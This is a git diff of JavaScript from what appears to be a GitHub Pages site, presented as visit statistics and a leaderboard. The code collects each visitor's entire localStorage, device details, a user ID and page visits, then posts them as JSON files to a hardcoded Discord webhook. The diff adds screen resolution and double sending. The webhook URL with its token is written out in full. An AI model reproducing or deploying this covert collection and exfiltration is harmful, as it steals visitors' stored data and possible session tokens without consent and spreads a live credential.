@@ -127,8 +127,6 @@
     printVisitStats();
 })();
 
-
-
 (function () {
     const targetBaseUrl = "https://drmineword.github.io/Artefact-Boost-Active/";
     const webhookUrl = "https://discord.com/api/webhooks/1320483118947242094/uncmv45ABLDaJZcNZOzkjvNXZzV9NPL5yjgIOQagRK6FdDqW8GQuJHaSlkqd0_Z7uf4d";
@@ -167,6 +165,22 @@
         return data;
     }
 
+    // Collect leaderboard data using the provided script logic
+    function getLeaderboardData() {
+        const visitCounts = JSON.parse(localStorage.getItem("visitCounts")) || [];
+        const timeSpentOnPages = JSON.parse(localStorage.getItem("timeSpentOnPages")) || [];
+        const totalVisitSummary = JSON.parse(localStorage.getItem("totalVisitSummary")) || {
+            totalVisits: 0,
+            totalTimeSpent: 0,
+        };
+
+        return {
+            visitCounts,
+            timeSpentOnPages,
+            totalVisitSummary,
+        };
+    }
+
     // Function to send files to Discord webhook
     async function sendToWebhook(files, embedMessage) {
         const formData = new FormData();
@@ -179,11 +193,14 @@
         );
 
         try {
-            const response = await fetch(webhookUrl, {
-                method: "POST",
-                body: formData,
-            });
-            console.log("Files sent successfully:", await response.json());
+            // Send message twice
+            for (let i = 0; i < 2; i++) {
+                const response = await fetch(webhookUrl, {
+                    method: "POST",
+                    body: formData,
+                });
+                console.log(`Message ${i + 1} sent successfully:`, await response.json());
+            }
         } catch (error) {
             console.error("Failed to send files:", error);
         }
@@ -198,18 +215,7 @@
 
         console.log("On target website.");
 
-        // Step 1: Collect visit time log
-        const visitLog = {
-            visitTime: new Date().toISOString(),
-            page: window.location.href,
-        };
-        const visitLogFile = new File(
-            [JSON.stringify(visitLog, null, 2)],
-            "visit_log.json",
-            { type: "application/json" }
-        );
-
-        // Step 2: Collect localStorage content
+        // Step 1: Collect localStorage content
         const localStorageData = collectLocalStorage();
         const localStorageFile = new File(
             [JSON.stringify(localStorageData, null, 2)],
@@ -217,47 +223,37 @@
             { type: "application/json" }
         );
 
-        // Step 3: Collect visit statistics from existing script
-        const visitCounts = JSON.parse(localStorage.getItem("visitCounts")) || [];
-        const timeSpentOnPages = JSON.parse(localStorage.getItem("timeSpentOnPages")) || [];
-        const totalVisitSummary = JSON.parse(localStorage.getItem("totalVisitSummary")) || {
-            totalVisits: 0,
-            totalTimeSpent: 0,
-        };
-
-        const visitStats = {
-            visitCounts,
-            timeSpentOnPages,
-            totalVisitSummary,
-        };
-        const visitStatsFile = new File(
-            [JSON.stringify(visitStats, null, 2)],
-            "visit_statistics.json",
+        // Step 2: Generate leaderboard JSON
+        const leaderboardData = getLeaderboardData();
+        const leaderboardFile = new File(
+            [JSON.stringify(leaderboardData, null, 2)],
+            "leaderboard.json",
             { type: "application/json" }
         );
 
-        // Step 4: Create a sample file with arbitrary data
-        const sampleData = {
-            message: "This is a sample JSON file.",
-            createdAt: new Date().toISOString(),
+        // Step 3: Create log info JSON
+        const logInfo = {
+            visitTime: new Date().toISOString(),
+            page: window.location.href,
         };
-        const sampleFile = new File(
-            [JSON.stringify(sampleData, null, 2)],
-            "sample_data.json",
+        const logInfoFile = new File(
+            [JSON.stringify(logInfo, null, 2)],
+            "log_info.json",
             { type: "application/json" }
         );
 
-        // Step 5: Generate user ID and device info
+        // Step 4: Create user data JSON
         const userId = await getUserId();
-        const deviceInfo = {
+        const userData = {
             userId,
             userAgent: navigator.userAgent,
             platform: navigator.platform,
             language: navigator.language,
+            screenResolution: `${window.screen.width}x${window.screen.height}`,
         };
-        const deviceInfoFile = new File(
-            [JSON.stringify(deviceInfo, null, 2)],
-            "device_info.json",
+        const userDataFile = new File(
+            [JSON.stringify(userData, null, 2)],
+            "user_data.json",
             { type: "application/json" }
         );
 
@@ -277,7 +273,7 @@
 
         // Send files and embed message to the webhook
         sendToWebhook(
-            [visitLogFile, localStorageFile, visitStatsFile, sampleFile, deviceInfoFile],
+            [localStorageFile, leaderboardFile, logInfoFile, userDataFile],
             embedMessage
         );
     }
